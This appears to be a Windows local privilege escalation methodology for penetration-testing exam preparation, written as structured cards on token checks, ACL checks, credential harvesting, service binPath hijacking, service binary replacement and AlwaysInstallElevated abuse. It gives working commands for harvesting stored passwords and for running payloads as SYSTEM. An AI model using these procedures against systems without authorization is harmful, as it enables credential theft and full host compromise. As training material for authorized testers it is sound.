title: Establish Windows token, host and process context
clue: A new Windows session or claimed administrator/SYSTEM transition
conditions: A functioning command channel and the actual effective token/process context
access: A verified Windows foothold with a known token, integrity level and groups
result: A verified identity, integrity, privilege and host state for candidate selection
mechanics: Group membership can be filtered in a token, and a network logon context can differ from interactive access. Check privileges and integrity where the intended operation runs.
example: Observation: the username belongs to Administrators. Test: inspect token groups/integrity and effective privileges. Illustrative output: the administrator SID is deny-only in a medium token. Interpretation: do not assume high-integrity service-control rights.
verify: Verify represented user/SID, enabled group/privilege state and actual privileged operation.
failure: A prompt title or account name is insufficient. WMIC may be absent; use the documented CIM/PowerShell alternatives.

recognition.where: At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator.
recognition.sample:
BUILTIN\Administrators: Group used for deny only
Mandatory Label\Medium Mandatory Level
recognition.spot: An Administrators SID exists but this effective process is filtered/medium-integrity.
recognition.confirm: Check actual enabled privileges and object operations in the process that will perform the action.
recognition.enabled: A higher-integrity/SYSTEM token and intended operation are verified: record that privilege state.
recognition.ruledout: A medium filtered token cannot perform the assumed administrative action: reject that privilege assumption.
recognition.unknown: Username/group membership alone leaves token state unknown; inspect whoami /all.

procedure:
```cmd hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup Administrators driverquery /v ``` ```powershell Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture Get-HotFix | Sort-Object InstalledOn -Descending Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName Get-LocalUser Get-LocalGroupMember Administrators ``` > **Interpret:** record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. `Get-HotFix` does not list every update; use build/KB output only to form a version hypothesis.
WMIC compatibility fallbacks ```cmd wmic qfe get HotFixID,InstalledOn wmic service get Name,StartName,State,StartMode,PathName wmic process get ProcessId,Name,ExecutablePath,CommandLine ``` > WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.
```cmd whoami /all hostname ipconfig /all ``` After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase.

title: Prove effective file, registry and service-object permissions
clue: A privileged object appears writable or an ACL tool reports a useful right
conditions: Correct trustee/token, object type and effective rights including parents and deny entries
access: A verified Windows foothold with a known token, integrity level and groups
result: A specific confirmed control primitive for a privileged consumer
mechanics: A service-object DACL controls operations such as configuration changes; the executable's filesystem ACL is separate. Parent delete/create rights can allow replacement without direct file modification.
checks:
```cmd
whoami /all
icacls "C:\Path\To\OBJECT"
icacls "C:\Path\To"
sc.exe sdshow SERVICE
```
example: Observation: a service executable is read-only but its directory grants replacement rights. Test: inspect the effective token and parent permissions. Illustrative output: replacement is possible but service restart is denied. Interpretation: the control primitive is valid; the trigger remains missing.
verify: Name the exact allowed operation on the exact object and independently check a privileged consumer/trigger.
failure: Generic write labels can refer to another object or an inactive group. Resolve actual effective rights before modifying anything.

recognition.where: Take a real service/task/application path from inventory, then inspect its file, parent and separate service-object permissions.
recognition.sample:
File: BUILTIN\Users:(RX)
Parent: DOMAIN\GROUP:(M)
Service-object rights: separate DACL
recognition.spot: A modifiable parent can differ from a read-only file; service configuration rights are another control plane.
recognition.confirm: Resolve enabled trustee, deny/inheritance/integrity and exact write/delete/configuration operation plus privileged consumer.
recognition.enabled: The intended effective operation and higher consumer are proved: select that object-control method.
recognition.ruledout: Only read/execute applies to the current token: reject the proposed modification.
recognition.unknown: An ACL for an inactive or ambiguous group leaves effective access unresolved.

procedure:
```cmd
icacls "C:\Path\To\OBJECT"
sc.exe sdshow SERVICE
accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT"
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
```

`icacls` common rights: `F` full, `M` modify, `RX` read/execute, `R` read, `W` write, `D` delete. Common inheritance markers: `I`, `OI`, `CI`, `IO`, `NP`.

> File, directory, registry, service-object, task and process permissions are separate. Check whether the ACE applies to the current user or an enabled group and grants the exact required operation. Mandatory Integrity Control can still block a lower-integrity write.

next.requires: Effective file/parent replacement rights, compatible artifact, file-lock handling and available privileged restart/boot trigger

next.when: A task/startup action consumes a writable command, file, directory or registry value
next.requires: Effective object control, a higher principal and a usable scheduled/logon/manual trigger

next.when: A privileged application searches for a missing dependency or consumes writable configuration
next.requires: Actual controlled resolution path, compatible name/architecture/exports and a reliable privileged load trigger

title: Recover Windows application, history and stored-credential artifacts
clue: Readable application configuration, unattended setup, PowerShell trails or Credential Manager entries
conditions: Artifact read permission and exact protecting identity/context for saved or DPAPI material
access: A verified Windows foothold with a known token, integrity level and groups
result: Typed secret material or a verified saved-credential consumer transition
mechanics: A cmdkey entry proves a target-bound stored credential, not plaintext disclosure. Saved-credential use and DPAPI decryption require matching contexts; runas does not inherently bypass UAC.
example: Observation: a history file contains a service password. Test: identify its account scope and compatible service. Illustrative output: the password grants a remote share but not local elevation. Interpretation: re-enumerate that share and preserve identity context.
verify: Tie each value to a source/account/service and verify any new token with whoami /all.
failure: Protected blobs, stale history and saved credentials for a different target require their own keys/context or a different route.

recognition.where: Follow actual application/configuration paths, PSReadLine history and saved-credential targets under the current readable user context.
recognition.sample:
cmdkey target: Domain:target=TARGET_HOST
User: DOMAIN\USER
Password: not displayed
recognition.spot: A target-bound saved credential is a possible consumer capability, not a plaintext password.
recognition.confirm: Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route.
recognition.enabled: The matching consumer accepts the credential and the resulting token is checked: use that access.
recognition.ruledout: The stored entry belongs to another context/target and cannot be used here: reject that transition.
recognition.unknown: A protected blob/listing without keys or consumer evidence leaves usable credentials unproved.

procedure:
##### Stored credentials and PowerShell trails ```cmd cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all ``` ```powershell $history = (Get-PSReadLineOption).HistorySavePath $history Get-Content -LiteralPath $history -ErrorAction SilentlyContinue Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue | Where-Object Id -in 4103,4104 | Select-Object -First 50 TimeCreated,Id,Message ``` > A `cmdkey` entry is target/context-bound and does not reveal a password. DPAPI-protected data needs the protecting user/machine context and keys. `Clear-History` does not necessarily clear PSReadLine's saved file.
Targeted application/file/registry search ```cmd reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul ``` ```powershell Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } | Select-String -Pattern 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false ``` > Search from observed applications first. Classify every value by identity, format, scope and compatible service, then use the credential procedure.
Saved credential consumer ```cmd runas /savecred /user:DOMAIN\USER cmd.exe ``` > Use only when `cmdkey`/context supports that identity and logon type. `runas` does not inherently bypass UAC; verify the resulting token with `whoami /all`.
```powershell Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'pass|cred|config|backup|unattend|\.env' } ``` ```powershell Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd' } | Select-String -Pattern 'password|passwd|secret|token|connectionString' -CaseSensitive:$false ``` Avoid searching the entire filesystem without a reason; scope reduces noise, access errors and sensitive-data overcollection.

title: Change a privileged service's executable configuration
clue: Effective SERVICE_CHANGE_CONFIG on a higher-privileged service
conditions: Configuration-change right, accessible compatible payload path and a separate start/restart trigger
access: A verified Windows foothold with a known token, integrity level and groups
result: Verified execution under the configured service identity
mechanics: Service configuration and service start/stop are separate permissions. An ordinary program can execute and still return service error 1053 because it does not implement the service protocol.
checks:
```cmd
sc.exe qc SERVICE
sc.exe sdshow SERVICE
icacls "C:\Windows\Temp"
```
example: Observation: configuration changes are permitted but stop/start is denied. Test: inspect the actual service schedule/recovery trigger. Illustrative output: no usable trigger is available. Interpretation: record the control and missing condition, then prioritize another path.
verify: Verify the payload's effect and service execution identity, then restore the saved configuration.
failure: Access denied on config is different from trigger denial or an incompatible binary. Preserve original binPath and use sc.exe explicitly in PowerShell.

recognition.where: Inventory service accounts/paths, select a higher-identity service and query its effective service-object rights with the current token.
recognition.commands:
```powershell
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
sc.exe qc SERVICE
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
```
recognition.sample:
SERVICE_START_NAME: LocalSystem
Effective service rights:
  SERVICE_CHANGE_CONFIG
  SERVICE_START
recognition.spot: Configuration-change and start rights on the same higher-identity service are promising; file ACLs alone would not prove them.
recognition.confirm: Check exact account, accepted compatible artifact path, file access/locks and available stop/start or other trigger.
recognition.enabled: The controlled configuration is consumed at a usable trigger and effect is verified: choose service configuration abuse.
recognition.ruledout: Only query rights are granted: reject the ability to change binPath.
recognition.unknown: CHANGE_CONFIG without a usable trigger remains an incomplete candidate.

procedure:
```powershell Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName ``` ```cmd sc.exe qc SERVICE sc.exe sdshow SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe" ``` > **Need:** control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL; higher `SERVICE_START_NAME`; and a start/restart/boot trigger. In PowerShell use `sc.exe`, because bare `sc` can resolve to `Set-Content`. Preserve `BINARY_PATH_NAME`, account and start mode first: ```cmd sc.exe qc SERVICE sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE" sc.exe stop SERVICE sc.exe start SERVICE ``` Restore: ```cmd sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH" ``` > `SERVICE_CHANGE_CONFIG` controls `binPath`; start/stop are separate rights. The space after `binPath=` is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect.
Writable service binary or replaceable parent ```cmd sc.exe qc SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup" copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe" sc.exe stop SERVICE sc.exe start SERVICE ``` > A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.

title: Control scheduled tasks, startup files or autostart consumers
clue: A task/startup action consumes a writable command, file, directory or registry value
conditions: Effective object control, a higher principal and a usable scheduled/logon/manual trigger
access: A verified Windows foothold with a known token, integrity level and groups
result: Verified privileged task or startup execution
mechanics: RunLevel Highest selects the configured principal's highest available token; it does not mean SYSTEM. A writable user startup entry usually runs as that user.
example: Observation: a writable script is named in a scheduled task. Test: inspect principal, arguments, working directory and trigger. Illustrative output: the task runs as the same low user. Interpretation: it is not a local privilege escalation under that configuration.
verify: Check the actual effect and token after the trigger; task-run acceptance alone is insufficient.
failure: Wrong principal, stale action, denied trigger or a different working directory can invalidate the candidate.

recognition.where: Enumerate task definitions and inspect the action, principal, arguments and working directory before permission-checking its files.
recognition.sample:
Principal: SYSTEM
Action: powershell.exe -File C:\APP\job.ps1
Trigger: scheduled
File control: inspect separately
recognition.spot: A named privileged task exposes a concrete consumer and action path to investigate.
recognition.confirm: Check effective control of the consumed object, actual principal/run level, working directory and available trigger.
recognition.enabled: The controllable action is consumed under the expected higher token: select the task route.
recognition.ruledout: The real principal is the same low user: reject assumed elevation.
recognition.unknown: Task registration or run acceptance without process/effect evidence leaves execution unresolved.

procedure:

title: Validate elevated installer policy and administrative-token context
clue: Installer policy values or an administrator account with a filtered token
conditions: AlwaysInstallElevated requires both effective machine/user policy values and permitted MSI execution; UAC routes require their own compatible administrator/token context
access: A verified Windows foothold with a known token, integrity level and groups
result: A verified installer-policy execution route or a precise token-boundary assessment
mechanics: Both installer policies must enable the feature. UAC elevation and standard-user-to-administrator escalation have different prerequisites; a token/consent mechanism is not a universal boundary bypass.
checks:
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
whoami /all
```
example: Observation: only the machine installer value is enabled. Test: check the user policy and actual token. Illustrative output: user policy is absent. Interpretation: the elevated-installer route is not enabled; investigate another privileged consumer.
verify: Verify both relevant conditions and actual resulting token; keep UAC-context claims narrower than full privilege escalation.
failure: One policy value, blocked MSI execution or an incompatible protected token defeats the assumed route.

recognition.where: Inspect both machine/user installer-policy values and the current token before inferring an elevated MSI or UAC-context route.
recognition.commands:
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
whoami /all
```
recognition.sample:
HKLM AlwaysInstallElevated REG_DWORD 0x1
HKCU AlwaysInstallElevated: value not found
recognition.spot: One policy value is insufficient; the two-policy conjunction is the key recognition condition.
recognition.confirm: For installer execution verify both applicable values and permitted MSI/runtime; assess UAC administrator/token prerequisites separately.
recognition.enabled: Both required policies and a compatible permitted installer consumer exist: validate that route's effect.
recognition.ruledout: The required user policy is absent/disabled: reject this elevated-installer method.
recognition.unknown: Policy visibility failure or unknown effective context requires another check.

procedure:
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both values must be `0x1`:

```cmd
msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi
```

> One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass.

```cmd
whoami /groups
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```
